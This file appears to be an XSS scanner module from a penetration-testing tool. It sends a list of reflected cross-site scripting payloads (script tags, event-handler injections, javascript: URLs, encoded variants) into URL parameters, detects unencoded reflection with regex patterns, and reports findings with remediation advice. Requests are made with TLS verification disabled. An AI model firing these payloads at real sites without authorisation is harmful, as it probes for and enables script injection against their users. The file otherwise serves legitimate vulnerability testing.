import re
from typing import List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests

from core.base_module import BaseModule, ScanResult, Finding

PAYLOADS = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert("XSS")>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '"><iframe src="javascript:alert(1)">',
    "javascript:alert(1)",
    '<input autofocus onfocus=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<<script>alert(1)//<</script>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
]

MARKER = "REDSCOPE_XSS_CANARY"
CANARY_PAYLOAD = f'<script>alert("{MARKER}")</script>'

REFLECTION_PATTERNS = [
    re.compile(r'<script[^>]*>.*?alert\s*\(', re.IGNORECASE | re.DOTALL),
    re.compile(r'onerror\s*=\s*alert', re.IGNORECASE),
    re.compile(r'onload\s*=\s*alert', re.IGNORECASE),
    re.compile(r'onfocus\s*=\s*alert', re.IGNORECASE),
    re.compile(r'ontoggle\s*=\s*alert', re.IGNORECASE),
    re.compile(r'<svg[^>]*onload', re.IGNORECASE),
    re.compile(r'<iframe[^>]*javascript:', re.IGNORECASE),
    re.compile(r'javascript\s*:\s*alert', re.IGNORECASE),
]


class Module(BaseModule):
    name = "xss"
    description = "Reflected XSS scanner — payload fuzzing with reflection analysis"
    author = "RedScope"
    version = "1.0.0"

    def run(self, target: str, **kwargs) -> ScanResult:
        result = ScanResult(module=self.name, target=target)
        url = target if target.startswith("http") else f"https://{target}"

        session = requests.Session()
        session.headers["User-Agent"] = self.config["general"]["user_agent"]
        timeout = self.config["general"]["timeout"]

        self.log.info(f"XSS scan on [bold]{url}[/]")

        params = self._extract_params(url)
        if not params:
            self.log.warning("No query parameters found — trying common param names")
            params = ["q", "search", "query", "s", "keyword", "name", "input",
                      "text", "comment", "message", "redirect", "url", "next", "ref"]
            base_url = url
        else:
            base_url = url.split("?")[0]

        for param in params:
            self.log.info(f"  Testing parameter: [cyan]{param}[/]")

            # Quick canary check first
            reflected = self._check_reflection(session, base_url, param, timeout)
            if not reflected:
                self.log.info(f"  [dim]No reflection for {param}, skipping[/]")
                continue

            self.log.info(f"  [yellow]Reflection detected[/] for {param} — fuzzing payloads")

            finding = self._fuzz_payloads(session, base_url, param, timeout)
            if finding:
                result.add_finding(finding)

        # Check headers for XSS protection
        try:
            resp = session.get(url, timeout=timeout, verify=False)
            self._check_xss_headers(resp, result)
        except requests.RequestException:
            pass

        if not result.findings:
            self.log.info("[dim]No XSS detected[/]")

        return result

    def _check_reflection(self, session, base_url, param, timeout) -> bool:
        try:
            resp = session.get(
                base_url,
                params={param: MARKER},
                timeout=timeout,
                verify=False,
            )
            return MARKER in resp.text
        except requests.RequestException:
            return False

    def _fuzz_payloads(self, session, base_url, param, timeout) -> Optional[Finding]:
        for payload in PAYLOADS:
            try:
                resp = session.get(
                    base_url,
                    params={param: payload},
                    timeout=timeout,
                    verify=False,
                    allow_redirects=True,
                )

                body = resp.text

                # Check if payload is reflected unencoded
                if payload.lower() in body.lower():
                    for pattern in REFLECTION_PATTERNS:
                        if pattern.search(body):
                            self.log.info(
                                f"  [bold red]XSS FOUND[/] param={param} payload={payload!r}"
                            )
                            return Finding(
                                title=f"Reflected XSS — parameter: {param}",
                                severity="high",
                                description=(
                                    f"Reflected Cross-Site Scripting detected in parameter '{param}'. "
                                    f"The payload is reflected in the response without sanitization, "
                                    f"allowing arbitrary JavaScript execution in victim's browser."
                                ),
                                evidence=(
                                    f"URL: {base_url}?{param}={payload}\n"
                                    f"Payload reflected unencoded in response body.\n"
                                    f"Matched pattern: {pattern.pattern}"
                                ),
                                remediation=(
                                    "Encode all user-supplied output with context-aware escaping "
                                    "(HTML entity encoding for HTML context, JS escaping for script context). "
                                    "Implement a strict Content-Security-Policy. "
                                    "Use frameworks that auto-escape by default (React, Angular, etc.)."
                                ),
                                tags=["xss", "reflected", "web"],
                            )
            except requests.RequestException:
                continue
        return None

    def _check_xss_headers(self, resp: requests.Response, result: ScanResult) -> None:
        headers = {k.lower(): v for k, v in resp.headers.items()}

        csp = headers.get("content-security-policy", "")
        if not csp:
            pass  # already flagged by headers module
        elif "unsafe-inline" in csp:
            result.add_finding(Finding(
                title="Weak CSP — 'unsafe-inline' Allows XSS",
                severity="medium",
                description=(
                    "Content-Security-Policy contains 'unsafe-inline', "
                    "which defeats XSS protection for inline scripts."
                ),
                evidence=f"Content-Security-Policy: {csp}",
                remediation="Remove 'unsafe-inline' and use nonces or hashes instead.",
                tags=["xss", "csp", "headers"],
            ))

        x_xss = headers.get("x-xss-protection", "")
        if x_xss.startswith("0"):
            result.add_finding(Finding(
                title="XSS Protection Explicitly Disabled",
                severity="medium",
                description="X-XSS-Protection header is set to 0, disabling browser-level XSS filter.",
                evidence=f"X-XSS-Protection: {x_xss}",
                remediation="Remove the header or set it to: X-XSS-Protection: 1; mode=block",
                tags=["xss", "headers"],
            ))

    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        return list(parse_qs(parsed.query).keys())
